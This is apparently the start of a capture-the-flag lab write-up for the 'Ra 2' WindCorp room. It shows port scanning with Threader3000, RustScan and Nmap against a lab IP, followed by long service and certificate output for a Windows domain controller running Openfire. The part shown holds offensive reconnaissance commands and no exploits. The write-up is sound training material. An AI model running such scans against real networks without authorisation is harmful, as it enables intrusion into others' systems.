---
Just when they thought their hashes were safe... Ra 2 - The sequel!
---

**Story**

WindCorp recently had a security-breach. Since then they have hardened their infrastructure, learning from their mistakes. But maybe not enough? You have managed to enter their local network...

Happy Hacking!

Created by @4nqr34z and @theart42

_(Give it at least 5 minutes to boot)_

```
┌──(kali㉿kali)-[~/threader3000]
└─$ git clone https://github.com/dievus/threader3000.git


┌──(kali㉿kali)-[~/threader3000]
└─$ python3 threader3000.py               
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.219.166
------------------------------------------------------------
Scanning target 10.10.219.166
Time started: 2022-12-22 13:38:53.039666
------------------------------------------------------------
Port 53 is open
Port 88 is open
Port 139 is open
Port 135 is open
Port 80 is open
Port 389 is open
Port 445 is open
Port 443 is open
Port 464 is open
Port 593 is open
Port 636 is open
Port 2179 is open
Port 3268 is open
Port 3269 is open
Port 3389 is open
Port 5229 is open
Port 5223 is open
Port 5222 is open
Port 5262 is open
Port 5263 is open
Port 5270 is open
Port 5269 is open
Port 5275 is open
Port 5276 is open
Port 7070 is open
Port 7443 is open
Port 7777 is open
Port 9091 is open
Port 9090 is open
Port 9389 is open
Port 49667 is open
Port 49668 is open
Port 49669 is open
Port 49670 is open
Port 49672 is open
Port 49689 is open
Port 49703 is open
Port scan completed in 0:01:47.086578
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p53,88,139,135,80,389,445,443,464,593,636,2179,3268,3269,3389,5229,5223,5222,5262,5263,5270,5269,5275,5276,7070,7443,7777,9091,9090,9389,49667,49668,49669,49670,49672,49689,49703 -sV -sC -T4 -Pn -oA 10.10.219.166 10.10.219.166
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal


┌──(kali㉿kali)-[~/threader3000]
└─$ rustscan -a 10.10.219.166 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.219.166:53
Open 10.10.219.166:80
Open 10.10.219.166:88
Open 10.10.219.166:135
Open 10.10.219.166:139
Open 10.10.219.166:389
Open 10.10.219.166:445
Open 10.10.219.166:464
Open 10.10.219.166:443
Open 10.10.219.166:593
Open 10.10.219.166:636
Open 10.10.219.166:2179
Open 10.10.219.166:3268
Open 10.10.219.166:3269
Open 10.10.219.166:3389
Open 10.10.219.166:5222
Open 10.10.219.166:5223
Open 10.10.219.166:5229
Open 10.10.219.166:5262
Open 10.10.219.166:5263
Open 10.10.219.166:5269
Open 10.10.219.166:5270
Open 10.10.219.166:5276
Open 10.10.219.166:5275
Open 10.10.219.166:7070
Open 10.10.219.166:7443
Open 10.10.219.166:7777
Open 10.10.219.166:9090
Open 10.10.219.166:9091
Open 10.10.219.166:9389
Open 10.10.219.166:49667
Open 10.10.219.166:49668
Open 10.10.219.166:49669
Open 10.10.219.166:49670
Open 10.10.219.166:49672
Open 10.10.219.166:49689
Open 10.10.219.166:49703
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 14:29 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating Ping Scan at 14:29
Scanning 10.10.219.166 [2 ports]
Completed Ping Scan at 14:29, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:29
Completed Parallel DNS resolution of 1 host. at 14:29, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:29
Scanning 10.10.219.166 [37 ports]
Discovered open port 53/tcp on 10.10.219.166
Discovered open port 139/tcp on 10.10.219.166
Discovered open port 445/tcp on 10.10.219.166
Discovered open port 135/tcp on 10.10.219.166
Discovered open port 80/tcp on 10.10.219.166
Discovered open port 3389/tcp on 10.10.219.166
Discovered open port 443/tcp on 10.10.219.166
Discovered open port 5269/tcp on 10.10.219.166
Discovered open port 49667/tcp on 10.10.219.166
Discovered open port 5276/tcp on 10.10.219.166
Discovered open port 7777/tcp on 10.10.219.166
Discovered open port 593/tcp on 10.10.219.166
Discovered open port 9091/tcp on 10.10.219.166
Discovered open port 5270/tcp on 10.10.219.166
Discovered open port 5263/tcp on 10.10.219.166
Discovered open port 88/tcp on 10.10.219.166
Discovered open port 9389/tcp on 10.10.219.166
Discovered open port 7443/tcp on 10.10.219.166
Discovered open port 389/tcp on 10.10.219.166
Discovered open port 3269/tcp on 10.10.219.166
Discovered open port 49703/tcp on 10.10.219.166
Discovered open port 5275/tcp on 10.10.219.166
Discovered open port 49670/tcp on 10.10.219.166
Discovered open port 9090/tcp on 10.10.219.166
Discovered open port 5222/tcp on 10.10.219.166
Discovered open port 464/tcp on 10.10.219.166
Discovered open port 49669/tcp on 10.10.219.166
Discovered open port 49672/tcp on 10.10.219.166
Discovered open port 3268/tcp on 10.10.219.166
Discovered open port 49668/tcp on 10.10.219.166
Discovered open port 7070/tcp on 10.10.219.166
Discovered open port 5223/tcp on 10.10.219.166
Discovered open port 636/tcp on 10.10.219.166
Discovered open port 5262/tcp on 10.10.219.166
Discovered open port 2179/tcp on 10.10.219.166
Discovered open port 49689/tcp on 10.10.219.166
Discovered open port 5229/tcp on 10.10.219.166
Completed Connect Scan at 14:29, 0.64s elapsed (37 total ports)
Initiating Service scan at 14:29
Scanning 37 services on 10.10.219.166
Completed Service scan at 14:31, 80.58s elapsed (37 services on 1 host)
NSE: Script scanning 10.10.219.166.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:31
NSE Timing: About 99.98% done; ETC: 14:31 (0:00:00 remaining)
Completed NSE at 14:31, 40.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:31
Completed NSE at 14:32, 11.64s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:32
Completed NSE at 14:32, 0.01s elapsed
Nmap scan report for 10.10.219.166
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-12-22 14:29:54 EST for 134s

PORT      STATE SERVICE             REASON  VERSION
53/tcp    open  domain              syn-ack Simple DNS Plus
80/tcp    open  http                syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://fire.windcorp.thm/
88/tcp    open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2022-12-22 19:30:01Z)
135/tcp   open  msrpc               syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804bdc395ce5dd7b19a5851c01d123ad
| SHA-1: 37f4e667cef75cc447c9d20125cf2b7d20b2c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:57+00:00; -1s from scanner time.
443/tcp   open  ssl/http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804bdc395ce5dd7b19a5851c01d123ad
| SHA-1: 37f4e667cef75cc447c9d20125cf2b7d20b2c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:56+00:00; -1s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
445/tcp   open  microsoft-ds?       syn-ack
464/tcp   open  kpasswd5?           syn-ack
593/tcp   open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804bdc395ce5dd7b19a5851c01d123ad
| SHA-1: 37f4e667cef75cc447c9d20125cf2b7d20b2c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:55+00:00; -2s from scanner time.
2179/tcp  open  vmrdp?              syn-ack
3268/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804bdc395ce5dd7b19a5851c01d123ad
| SHA-1: 37f4e667cef75cc447c9d20125cf2b7d20b2c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:58+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
|_ssl-date: 2022-12-22T19:31:56+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-29T03:31:08
| Not valid after:  2028-05-29T03:41:03
| MD5:   804bdc395ce5dd7b19a5851c01d123ad
| SHA-1: 37f4e667cef75cc447c9d20125cf2b7d20b2c1f4
| -----BEGIN CERTIFICATE-----
| MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTAeFw0yMDA1MjkwMzMxMDhaFw0y
| ODA1MjkwMzQxMDNaMBwxGjAYBgNVBAMMEWZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv900af0f6n80F0J6U9jMgcwQrozr
| kXmi02esW1XAsHpWnuuMQDIN6AtiYmDcoFEXz/NteLI7T6PusqQ6SXqLBurTnR8V
| InPD3Qea6lxOXNjuNeqqZKHhUaXiwSaqtAB+GzPkNtevw3jeEj99ST/G1qwY9Xce
| sfeqR2J4kQ+8U5yKLJDPBxOSx3+SHjKErrLTk66lrlEi4atr+P/ccXA5TBkZFkYh
| i3YdKTDnYeP2fMrqvOqpw82eniHAGJ2N8JJbNep86ps8giIRieBUUclF/WCp4c33
| p4i1ioVxJIYJj6f0tjGhy9GxB7l69OtUutcIG0/FhxL2dQ86MmnHH0dE7QIDAQAB
| o4GnMIGkMA4GA1UdDwEB/wQEAwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYB
| BQUHAwEwVAYDVR0RBE0wS4IRZmlyZS53aW5kY29ycC50aG2CGHNlbGZzZXJ2aWNl
| LndpbmRjb3JwLnRobYIcc2VsZnNlcnZpY2UuZGV2LndpbmRjb3JwLnRobTAdBgNV
| HQ4EFgQUIZvYlCIhAOFLRutycf6U2H6LhqIwDQYJKoZIhvcNAQELBQADggEBAKVC
| ZS6HOuSODERi/glj3rPJaHCStxHPEg69txOIDaM9fX4WBfmSjn+EzlrHLdeRS22h
| nTPirvuT+5nn6xbUrq9J6RCTZJD+uFc9wZl7Viw3hJcWbsO8DTQAshuZ5YJ574pG
| HjyoVDOfYhy8/8ThvYf1H8/OaIpG4UIo0vY9qeBQBOPZdbdVjWNerkFmXVq+MMVf
| pAt+FffQE/48kTCppuSKeM5ZMgHP1/zhZqyJ3npljVDlgppjvh1loSYB+reMkhwK
| 2gpGJNwxLyFDhTMLaj0pzFL9okqs5ovEWEj8p96hEE6Xxl4ZApv6mxTs9j2oY6+P
| MTUqFyYKchFUeYlgf7k=
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server       syn-ack Microsoft Terminal Services
|_ssl-date: 2022-12-22T19:31:56+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Issuer: commonName=Fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-21T18:29:48
| Not valid after:  2023-06-22T18:29:48
| MD5:   aa8d74009e3e023b81a1ee3572528f4e
| SHA-1: 1d8d42b74d461e3edf7101fdf5807bef6d1f71b9
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQUolJNkPosrpDW+fy+RcynzANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yMjEyMjExODI5NDhaFw0y
| MzA2MjIxODI5NDhaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvSUKk9BuwKO4ZvgK+6Os8Wfaox7m
| 4rQzHZGyJW66E9UP1q1VzudT3Q51PrNRrXbiV/+3Z29sb6tjGulfDNZN7mssESIw
| d1GnoDvDY7ZHtWMQaiMRV3eAavbSIOlIsD42Yzq7OoSoJEytPZS3BMLSjhLSjN6u
| 3UfNW1bu7BV8VKz5lAnOPaEWCxCZAHiYH1uXFPmFPyebMGFarFgpOx3oeJ6wwhVQ
| UG1qbtoFpEZkZ7LG715f6bDt3oBReFCMhLj9Zqe8TDytgZoCeFygXHXUGaiU+cXO
| TqiOoSglrUwWoaNm5+M0fvNZuew6p3LBdeY9WGixtiO/vQfqWYyTXUnSlQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBAGGxjTHOBn91GeDXijQqsQSwH2xFm+2maFwt9yIRAhgjub+I/lFo
| 6FgaZ2wB/a0C3v9Wjilvtl4DT1msu5lD8z2Uf0xeXFrRxCBi4wTsQSHEPS4rEb6g
| 6w/Vs+qFDUcwWrefRuXSCOZHRtCM/7T7591kUZPrqvMFr071m6wMMBeGq6Wp+e3K
| wW6fakF6qOvAO+o8W2delI0HUj9y/HMTup9GJDzw3Hz37uOYoc9fHnvHayVjIiHK
| tR4PD12UvbR+84/gHVWEi98fR1J2kJvZOUxvQNCmpxtzFtkVIA1TxlyGAe3I4jtC
| lo+l8TDNBRuIWozrIMUYGoC2HWGDMTIjZx8=
|_-----END CERTIFICATE-----
5222/tcp  open  jabber              syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     compression_methods: 
|     features: 
|     stream_id: 4h64nvl9gw
|     xmpp: 
|_      version: 1.0
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:58+00:00; -2s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5223/tcp  open  ssl/jabber          syn-ack Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
